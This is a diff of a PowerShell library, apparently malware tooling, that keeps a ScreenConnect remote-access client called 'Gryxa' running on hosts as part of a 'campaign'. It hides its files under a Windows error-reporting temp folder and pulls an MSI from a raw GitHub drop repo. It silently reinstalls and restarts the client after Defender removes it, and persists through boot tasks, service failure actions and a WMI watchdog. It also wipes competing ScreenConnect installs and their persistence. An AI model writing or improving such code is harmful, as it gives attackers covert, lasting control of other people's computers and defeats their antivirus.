@@ -1,8 +1,10 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L38
+# OWN_LIB  BUILD 20260804L39
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
+# L39: relay-verified Gryxa keeper adoption; INFLIGHT≠HEALTHY; real -Force/-Deep;
+#      post-Gryxa /i sevrz restore; Test-MsiPackage; TASK_G in state; persistence purge w/o FP-only.
 # L38: TASK_G WucacheGryxaBoot ONSTART runs gryxa-ensure -NoWait -Force at boot (Defender strips SCM entry at startup). L37: MSI magic+FP validate.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
@@ -20,7 +22,7 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true)]
-    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'tasks-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate', 'gryxa-health', 'gryxa-ensure')]
+    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'tasks-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate', 'gryxa-health', 'gryxa-ensure', 'sync-gryxa-fp', 'test-msi')]
     [string]$Action,
     [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
     [string]$MonPath = '',
@@ -387,15 +389,41 @@ function Set-GryxaFp([string]$Fingerprint) {
     ) | Set-Content -LiteralPath (Get-GryxaCfgPath) -Encoding ASCII -Force
 }
 
+# L39: never adopt a foreign SC as Gryxa. Keeper only if FP is ExpectedFp OR
+# ImagePath/cmdline contains gryxa.com (or cfg RELAY host). Do NOT trust cfg alone —
+# a poisoned CURRENT_FP would self-whitelist forever.
+function Test-IsGryxaFp([string]$Fp) {
+    if (-not $Fp) { return $false }
+    $fp = $Fp.ToLower()
+    if ($fp -in $script:SevrzKeep) { return $false }
+    if ($script:GryxaExpectedFp -and $fp -eq $script:GryxaExpectedFp.ToLower()) { return $true }
+    $name = "ScreenConnect Client ($fp)"
+    $img = [string](Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$name" -ErrorAction SilentlyContinue).ImagePath
+    $relay = $script:GryxaRelayHost
+    if ($img -and ($img -match '(?i)gryxa\.com' -or ($relay -and $img -like "*$relay*"))) { return $true }
+    foreach ($proc in (Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue)) {
+        $blob = "$([string]$proc.ExecutablePath) $([string]$proc.CommandLine)"
+        if ($blob -like "*$fp*" -and ($blob -match '(?i)gryxa\.com' -or ($relay -and $blob -like "*$relay*"))) {
+            return $true
+        }
+    }
+    return $false
+}
+
 function Get-KeepFingerprints {
     $set = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
-    [void]$set.Add('5f6010579852e507'); [void]$set.Add('f861c8140d453427'); [void]$set.Add((Get-GryxaFp))
+    [void]$set.Add('5f6010579852e507'); [void]$set.Add('f861c8140d453427')
     if ($script:GryxaExpectedFp) { [void]$set.Add($script:GryxaExpectedFp) }
+    $cfg = Get-GryxaFp
+    if ($cfg -and (Test-IsGryxaFp $cfg)) { [void]$set.Add($cfg) }
+    elseif ($script:GryxaExpectedFp) { [void]$set.Add($script:GryxaExpectedFp) }
+    else { [void]$set.Add($script:GryxaDefaultFp) }
     foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
         if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
         if ($svc.Name -match '\(([0-9a-f]{16})\)') {
             $fp = $matches[1].ToLower()
-            if ($fp -notin $script:SevrzKeep) { [void]$set.Add($fp); Set-GryxaFp $fp }
+            if ($fp -in $script:SevrzKeep) { continue }
+            if (Test-IsGryxaFp $fp) { [void]$set.Add($fp); Set-GryxaFp $fp }
         }
     }
     return @($set)
@@ -457,13 +485,14 @@ function Test-ScDir([string]$Fingerprint) {
 
 function Find-RunningGryxaFp {
     $cfg = Get-GryxaFp
-    if (Test-ScRunning $cfg) { return $cfg }
+    if ($cfg -and (Test-ScRunning $cfg) -and (Test-IsGryxaFp $cfg)) { return $cfg }
+    if ($script:GryxaExpectedFp -and (Test-ScRunning $script:GryxaExpectedFp)) { return $script:GryxaExpectedFp.ToLower() }
     foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
         if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
         if ($svc.Name -match '\(([0-9a-f]{16})\)') {
             $fp = $matches[1].ToLower()
             if ($fp -in $script:SevrzKeep) { continue }
-            return $fp
+            if (Test-IsGryxaFp $fp) { return $fp }
         }
     }
     return $null
@@ -473,11 +502,16 @@ function Test-AnyNonSevrzScRunning { return [bool](Find-RunningGryxaFp) }
 
 function Get-GryxaStatus([string]$fp) {
     $svc = Get-Service -Name "ScreenConnect Client ($fp)" -ErrorAction SilentlyContinue
-    $running = [bool]($svc -and $svc.Status -eq 'Running')
+    # L39: StartPending/ContinuePending = healthy-in-progress (not BROKEN)
+    $running = [bool]($svc -and $svc.Status -in @('Running','StartPending','ContinuePending'))
     $dir = Test-ScDir $fp
     $guid = Find-ProductGuid $fp
-    $tcpR = Test-TcpHostPort $script:GryxaRelayHost 443
-    $tcpU = Test-TcpHostPort $script:GryxaUiHost 443
+    $tcpR = $true; $tcpU = $true
+    # skip TCP on hot path when already running unless Deep (Deep sets Extra=deep-tcp via caller)
+    if ($Deep -or -not $running) {
+        $tcpR = Test-TcpHostPort $script:GryxaRelayHost 443
+        $tcpU = Test-TcpHostPort $script:GryxaUiHost 443
+    }
     if ($running) { return "HEALTHY|$fp|running=1|relay=$tcpR|ui=$tcpU" }
     if ($svc -and $dir) { return "BROKEN|$fp|svc-present-stopped|relay=$tcpR|ui=$tcpU" }
     if (-not $svc -and ($dir -or $guid)) { return "STUCK|$fp|registered-no-service|relay=$tcpR|ui=$tcpU" }
@@ -517,18 +551,34 @@ function Uninstall-ScFingerprint([string]$Fingerprint) {
     return 'removed'
 }
 
+function Test-MsiPackage([string]$Path, [string]$ExpectedFp = '') {
+    # Shared OLE-magic + optional ProductName FP gate (L37/L39). Used by Gryxa + sevrz install paths.
+    if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return $false }
+    if ((Get-Item -LiteralPath $Path).Length -lt 500000) { return $false }
+    try {
+        $fs = [System.IO.File]::OpenRead((Resolve-Path -LiteralPath $Path).Path)
+        $magic = New-Object byte[] 4
+        $null = $fs.Read($magic, 0, 4)
+        $fs.Close()
+        if (-not ($magic[0] -eq 0xD0 -and $magic[1] -eq 0xCF -and $magic[2] -eq 0x11 -and $magic[3] -eq 0xE0)) { return $false }
+    } catch { return $false }
+    if ($ExpectedFp) {
+        $fp = Get-FpFromProductName (Get-MsiProperty $Path 'ProductName')
+        if (-not $fp -or $fp -ne $ExpectedFp.ToLower()) { return $false }
+    }
+    return $true
+}
+
 function Get-GryxaMsi {
     $msi = Join-Path $WorkDir 'pkg_gryxa.msi'
     # When an FP is pinned, the cached MSI must match it; otherwise refetch.
     if ((Test-Path $msi) -and ((Get-Item $msi).Length -gt 1000000)) {
         if (-not $script:GryxaExpectedFp) { return $msi }
-        $cachedFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
-        if ($cachedFp -eq $script:GryxaExpectedFp) { return $msi }
+        if (Test-MsiPackage $msi $script:GryxaExpectedFp) { return $msi }
         Remove-Item -LiteralPath $msi -Force -ErrorAction SilentlyContinue
     }
     $tmp = Join-Path $env:TEMP ("sc_gryxa_{0}.msi" -f [guid]::NewGuid().ToString('N'))
-    # L31: github-drop FIRST (raw/jsdelivr work even when ui.gryxa.com TLS is broken on
-    # the host: schannel SEC_E_INVALID_TOKEN). ui.gryxa.com is only a fallback.
+    # L31: github-drop FIRST (raw works even when ui.gryxa.com TLS is broken).
     $urls = @(
         'https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi',
         $script:GryxaMsiUrl
@@ -540,18 +590,8 @@ function Get-GryxaMsi {
             Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
             & $curl -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o $tmp $u 2>&1 | Out-Null
             if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) {
-                # L37: validate it's a real MSI (OLE magic d0cf11e0). CDNs (jsdelivr) can return
-                # a small error page or an HTML redirect for binaries; a wrong-FP / non-MSI blob
-                # must never be installed.
-                $fs = [System.IO.File]::OpenRead($tmp); $magic = New-Object byte[] 4; $null = $fs.Read($magic,0,4); $fs.Close()
-                if (-not ($magic[0] -eq 0xD0 -and $magic[1] -eq 0xCF -and $magic[2] -eq 0x11 -and $magic[3] -eq 0xE0)) { continue }
-                # FP-guard: when pinned, the MSI's FP MUST be readable and match. An unreadable
-                # or mismatched FP -> reject (never install an unverifiable package).
-                if ($script:GryxaExpectedFp) {
-                    $dlFp = Get-FpFromProductName (Get-MsiProperty $tmp 'ProductName')
-                    if ($dlFp -ne $script:GryxaExpectedFp) { continue }
-                }
-                # cache into WorkDir when possible; if the workdir is ACL-locked, install from TEMP directly
+                $exp = if ($script:GryxaExpectedFp) { $script:GryxaExpectedFp } else { '' }
+                if (-not (Test-MsiPackage $tmp $exp)) { continue }
                 try { Copy-Item -LiteralPath $tmp -Destination $msi -Force -ErrorAction Stop; return $msi } catch { return $tmp }
             }
         } catch {}
@@ -629,6 +669,13 @@ function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
     $lines += "sc config `"ScreenConnect Client ($Fp)`" start= auto"
     $lines += "sc failure `"ScreenConnect Client ($Fp)`" reset= 86400 actions= restart/3000/restart/3000/restart/3000"
     $lines += "sc start `"ScreenConnect Client ($Fp)`""
+    # L39: Gryxa /i can RemoveExistingProducts sevrz via shared UpgradeCode — recreate keepers after.
+    foreach ($sk in $script:SevrzKeep) {
+        $lines += "sc config `"ScreenConnect Client ($sk)`" start= auto >nul 2>&1"
+        $lines += "sc start `"ScreenConnect Client ($sk)`" >nul 2>&1"
+    }
+    $resultFile = Join-Path $WorkDir 'gryxa_install.result'
+    $lines += "echo %ERRORLEVEL%>`"$resultFile`""
     $lines += "del /f /q `"$cmd`" >nul 2>&1"
     $lines += 'exit'
     Set-Content -LiteralPath $cmd -Value $lines -Encoding ASCII -Force
@@ -646,23 +693,37 @@ function Invoke-GryxaEnsure {
 
     $installCmd = Join-Path $WorkDir 'gryxa_install.cmd'
     # L32: only honor the single-flight lock if msiexec is ACTUALLY running.
-    # A stale wrapper from a killed/failed install must not block recovery.
     if ((Test-Path $installCmd) -and (((Get-Date) - (Get-Item $installCmd).LastWriteTime).TotalMinutes -lt 15)) {
         $msiRunning = [bool](Get-CimInstance Win32_Process -Filter "Name='msiexec.exe'" -ErrorAction SilentlyContinue |
             Where-Object { $_.CommandLine -match 'gryxa|pkg_gryxa|ScreenConnect' })
-        if ($msiRunning) { GLog 'inflight_install'; return "HEALTHY|$(Get-GryxaFp)|inflight=1" }
-        # wrapper present but no install running -> stale; clear it and continue
+        if ($msiRunning) { GLog 'inflight_install'; return "INFLIGHT|$(Get-GryxaFp)|inflight=1" }
         Remove-Item -LiteralPath $installCmd -Force -ErrorAction SilentlyContinue
         GLog 'stale_install_wrapper_cleared'
     }
 
     $fp = Get-GryxaFp
-
-    # FP rotation: if an expected FP is pinned and the host is on a different one,
-    # migrate (uninstall old FP, install expected) instead of calling the old
-    # running instance "healthy".
     $exp = $script:GryxaExpectedFp
-    if ($exp) {
+    if (-not $exp) { $exp = $fp }
+
+    # L39 -Force: bypass healthy-skip; nuke+install ExpectedFp
+    if ($Force) {
+        GLog "force_reinstall target=$exp"
+        $msi = Get-GryxaMsi
+        if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$exp|msi-unavailable" }
+        $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
+        if (-not $newFp) { $newFp = $exp }
+        foreach ($old in @($fp, (Find-RunningGryxaFp), $exp) | Where-Object { $_ } | Select-Object -Unique) {
+            if ($old -ne $newFp) { GLog "force_uninstall old=$old"; $null = Uninstall-ScFingerprint $old }
+        }
+        Clear-GryxaArp $newFp
+        Set-GryxaFp $newFp
+        Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
+        Mark-GryxaReinstall
+        return "INFLIGHT|$newFp|force-spawned=1"
+    }
+
+    # FP rotation: migrate when pinned expected differs from current/running
+    if ($script:GryxaExpectedFp) {
         $runningFp0 = Find-RunningGryxaFp
         if (($fp -ne $exp) -or ($runningFp0 -and $runningFp0 -ne $exp)) {
             GLog "fp_drift migrate current=$fp running=$runningFp0 expected=$exp"
@@ -678,19 +739,26 @@ function Invoke-GryxaEnsure {
             Set-GryxaFp $newFp
             Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
             Mark-GryxaReinstall
-            return "HEALTHY|$newFp|migrate-spawned=1"
+            return "INFLIGHT|$newFp|migrate-spawned=1"
         }
     }
 
     $runningFp = Find-RunningGryxaFp
     if ($runningFp) {
         Set-GryxaFp $runningFp
+        # L39 -Deep: TCP/relay advisory; do NOT reinstall solely on TCP fail (learned that lesson)
+        if ($Deep) {
+            $tcpR = Test-TcpHostPort $script:GryxaRelayHost 443
+            $tcpU = Test-TcpHostPort $script:GryxaUiHost 443
+            GLog "deep_ok fp=$runningFp relay=$tcpR ui=$tcpU"
+            return "HEALTHY|$runningFp|running=1|deep=1|relay=$tcpR|ui=$tcpU"
+        }
         GLog "healthy_running fp=$runningFp"
         return "HEALTHY|$runningFp|running=1"
     }
 
     $st = Get-GryxaStatus $fp
-    GLog "status=$st force=$Force"
+    GLog "status=$st force=$Force deep=$Deep"
     $kind = $st.Split('|')[0]
 
     switch ($kind) {
@@ -709,13 +777,12 @@ function Invoke-GryxaEnsure {
             if (-not $newFp) { $newFp = $fp }
             GLog "broken_clean_reinstall fp=$fp new=$newFp"
             $null = Uninstall-ScFingerprint $fp
+            Set-GryxaFp $newFp
             Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
             Mark-GryxaReinstall
-            return "HEALTHY|$newFp|install-spawned=1"
+            return "INFLIGHT|$newFp|install-spawned=1"
         }
         'STUCK' {
-            # L36: if the binaries survived (e.g. Defender stripped only the service entry at
-            # boot) re-create the service from disk — no download, no reinstall, heals in secs.
             if (Test-ScDir $fp) {
                 GLog "stuck_service_recreate fp=$fp"
                 Repair-SCService $fp
@@ -728,12 +795,12 @@ function Invoke-GryxaEnsure {
             GLog "stuck_nuke_and_install fp=$fp new=$newFp"
             Clear-GryxaArp $fp
             if ($newFp -ne $fp) { Clear-GryxaArp $newFp }
+            Set-GryxaFp $newFp
             Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
             Mark-GryxaReinstall
-            return "HEALTHY|$newFp|install-spawned=1"
+            return "INFLIGHT|$newFp|install-spawned=1"
         }
         default {
-            # L36: ABSENT but binaries on disk -> service entry stripped; re-create, no reinstall.
             if (Test-ScDir $fp) {
                 GLog "absent_service_recreate fp=$fp"
                 Repair-SCService $fp
@@ -747,7 +814,7 @@ function Invoke-GryxaEnsure {
             Set-GryxaFp $newFp
             Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
             Mark-GryxaReinstall
-            return "HEALTHY|$newFp|install-spawned=1"
+            return "INFLIGHT|$newFp|install-spawned=1"
         }
     }
 }
@@ -767,13 +834,12 @@ function Invoke-Exterminate {
         Add-Content -LiteralPath $log -Value $line -ErrorAction SilentlyContinue
         # O41: do NOT Write-Output Log lines (pollutes for /f callers)
     }
-    # Protect Gryxa during start race: any live SC process whose path embeds a
-    # non-sevrz FP is a keeper even if the service is not Running yet.
+    # Protect Gryxa during start race: only live SC procs with verified Gryxa relay/FP
     Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
         $blob = "$([string]$_.ExecutablePath) $([string]$_.CommandLine)"
         if ($blob -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') {
             $fp = $Matches[1].ToLower()
-            if ($fp -notin $script:SevrzKeep -and $fp -notin $keep) {
+            if ($fp -notin $script:SevrzKeep -and (Test-IsGryxaFp $fp) -and $fp -notin $keep) {
                 $keep += $fp
                 Set-GryxaFp $fp
                 Log "keep_add_from_proc fp=$fp"
@@ -817,6 +883,14 @@ function Invoke-Exterminate {
         $guid = $key.PSChildName
         $prop = Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue
         $dn = $prop.DisplayName
+        # L39: refuse /x if DisplayName FP is a keeper (shared ProductCode collision can kill Gryxa)
+        if ($dn -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') {
+            $fpDn = $Matches[1].ToLower()
+            if ($fpDn -in $keep -or (Test-IsGryxaFp $fpDn)) {
+                Log "product_skip_keeper_fp [$dn] guid=$guid"
+                return $false
+            }
+        }
         if ($guid -like '{*}') {
             $p = Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart REBOOT=ReallySuppress" -Wait -PassThru -WindowStyle Hidden
             Log "product_msiexec [$dn] guid=$guid exit=$($p.ExitCode)"
@@ -849,24 +923,28 @@ function Invoke-Exterminate {
     # Gryxa again). Purge the persistence FIRST so product/svc/dir removal is permanent.
     function Get-NonKeeperScFps {
         $fps = @{}
-        Get-Service -ErrorAction SilentlyContinue |
-            Where-Object { $_.Name -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)' } |
-            ForEach-Object { $fps[$Matches[1].ToLower()] = $true }
+        Get-Service -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_.Name -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') {
+                $fps[$matches[1].ToLower()] = $true
+            }
+        }
         Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
-            if ("$([string]$_.ExecutablePath) $([string]$_.CommandLine)" -match '\(([0-9a-fA-F]{16})\)') { $fps[$Matches[1].ToLower()] = $true }
+            if ("$([string]$_.ExecutablePath) $([string]$_.CommandLine)" -match '\(([0-9a-fA-F]{16})\)') {
+                $fps[$matches[1].ToLower()] = $true
+            }
         }
         foreach ($root in $script:UninstallRoots) {
             if (-not (Test-Path $root)) { continue }
             Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
                 $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
-                if ($dn -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') { $fps[$Matches[1].ToLower()] = $true }
+                if ($dn -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') { $fps[$matches[1].ToLower()] = $true }
             }
         }
         foreach ($base in @($env:ProgramFiles, ${env:ProgramFiles(x86)})) {
             if (-not $base -or -not (Test-Path $base)) { continue }
-            Get-ChildItem -LiteralPath $base -Directory -Force -ErrorAction SilentlyContinue |
-                Where-Object { $_.Name -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)' } |
-                ForEach-Object { $fps[$Matches[1].ToLower()] = $true }
+            Get-ChildItem -LiteralPath $base -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                if ($_.Name -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') { $fps[$matches[1].ToLower()] = $true }
+            }
         }
         @($fps.Keys | Where-Object { $_ -notin $keep })
     }
@@ -880,21 +958,24 @@ function Invoke-Exterminate {
     }
 
     function Remove-ScPersistence([string]$Fp) {
-        # scheduled tasks whose action references this FP's client/installer
+        # L39: purge ScreenConnect persistence referencing this FP OR generic SC installers
+        # that are not keeper-protected (bare msiexec /i URL watchdogs without FP literal).
         try {
             Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
                 $task = $_
                 $blob = ''
                 foreach ($a in $task.Actions) { $blob += " $($a.Execute) $($a.Arguments)" }
-                if ($blob -notmatch '(?i)ScreenConnect' -and $blob -notmatch [regex]::Escape($Fp)) { return }
+                if ($blob -notmatch '(?i)ScreenConnect|msiexec') { return }
                 if (Test-ScKeeperRef $blob) { return }
-                if ($blob -match [regex]::Escape($Fp)) {
+                $hit = $false
+                if ($Fp -and $blob -match [regex]::Escape($Fp)) { $hit = $true }
+                elseif ($blob -match '(?i)ScreenConnect\.ClientSetup|ScreenConnect Client|pkg_gryxa\.msi|pkg\.msi') { $hit = $true }
+                if ($hit) {
                     Unregister-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -Confirm:$false -ErrorAction SilentlyContinue
                     Log "persist_task_removed $($task.TaskPath)$($task.TaskName) fp=$Fp"
                 }
             }
         } catch { Log "persist_task_enum_err $_" }
-        # Run / RunOnce keys re-launching this FP's client or installer
         foreach ($rk in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                           'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
                           'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
@@ -907,7 +988,12 @@ function Invoke-Exterminate {
             foreach ($prop in $p.PSObject.Properties) {
                 if ($prop.Name -like 'PS*') { continue }
                 $v = [string]$prop.Value
-                if ($v -match [regex]::Escape($Fp) -and $v -match '(?i)ScreenConnect' -and -not (Test-ScKeeperRef $v)) {
+                if (Test-ScKeeperRef $v) { continue }
+                if ($v -notmatch '(?i)ScreenConnect|msiexec') { continue }
+                $hit = $false
+                if ($Fp -and $v -match [regex]::Escape($Fp)) { $hit = $true }
+                elseif ($v -match '(?i)ScreenConnect\.ClientSetup|ScreenConnect Client') { $hit = $true }
+                if ($hit) {
                     Remove-ItemProperty -Path $rk -Name $prop.Name -Force -ErrorAction SilentlyContinue
                     Log "persist_runkey_removed $rk\$($prop.Name) fp=$Fp"
                 }
@@ -1121,6 +1207,13 @@ function Update-State {
         $marker = if ($k -eq 'TASK_B') { 'etl_mon.cmd' } else { 'own_mon.cmd' }
         if ((Test-TaskOwnsMon $tn $marker) -or (Test-TaskOwnsMon ("\$tn") $marker)) { $tasksOk++ }
     }
+    # L39: count WucacheGryxaBoot (TASK_G)
+    $tasksTotal++
+    $tgName = 'WucacheGryxaBoot'
+    if ((Get-ScheduledTask -TaskName $tgName -ErrorAction SilentlyContinue) -or
+        (Test-Path -LiteralPath (Join-Path $WorkDir 'gryxa_boot.cmd'))) {
+        $tasksOk++
+    }
     if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
     $wd = Ensure-Watchdog
     $prev = @{}
@@ -1162,17 +1255,41 @@ switch ($Action) {
     'registered'      { Test-SCRegistered $Fp }
     'exterminate'     { Invoke-Exterminate }
     'gryxa-health'    { Test-GryxaHealth }
+    'sync-gryxa-fp'   {
+        $g = Find-RunningGryxaFp
+        if ($g) {
+            Set-GryxaFp $g
+            Write-Output "SYNCED|$g"
+        } else {
+            $cur = Get-GryxaFp
+            if (-not (Test-IsGryxaFp $cur) -and $script:GryxaExpectedFp) {
+                Set-GryxaFp $script:GryxaExpectedFp
+                Write-Output "RESET|$($script:GryxaExpectedFp)"
+            } else {
+                Write-Output "NONE|$cur"
+            }
+        }
+    }
+    'test-msi'        {
+        $path = $Extra
+        if (-not $path) { Write-Output 'no'; break }
+        if (Test-MsiPackage $path $Fp) { Write-Output 'yes' } else { Write-Output 'no' }
+    }
     'gryxa-ensure'    {
         if ($NoWait) {
-            # L35: relaunch the real ensure fully detached and return instantly. Hosts with a
-            # ~10s Run-tool cap were killing the ensure mid-COM/CIM/MSI work before it could
-            # spawn the installer. The detached child does all slow work off the clock.
+            # L35/L39: pass ArgumentList as string array (joined string is a Start-Process footgun)
             $ps = (Get-Process -Id $PID).Path
             if (-not $ps) { $ps = 'powershell.exe' }
-            $argList = @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$PSCommandPath`"",'-Action','gryxa-ensure','-WorkDir',"`"$WorkDir`"",'-Build',$Build)
+            $argList = @(
+                '-NoProfile', '-ExecutionPolicy', 'Bypass',
+                '-File', $PSCommandPath,
+                '-Action', 'gryxa-ensure',
+                '-WorkDir', $WorkDir,
+                '-Build', $Build
+            )
             if ($Deep)  { $argList += '-Deep' }
             if ($Force) { $argList += '-Force' }
-            Start-Process -FilePath $ps -ArgumentList ($argList -join ' ') -WindowStyle Hidden
+            Start-Process -FilePath $ps -ArgumentList $argList -WindowStyle Hidden
             Write-Output 'QUEUED|detached=1'
         } else {
             Write-Output (Invoke-GryxaEnsure | Out-String).Trim()
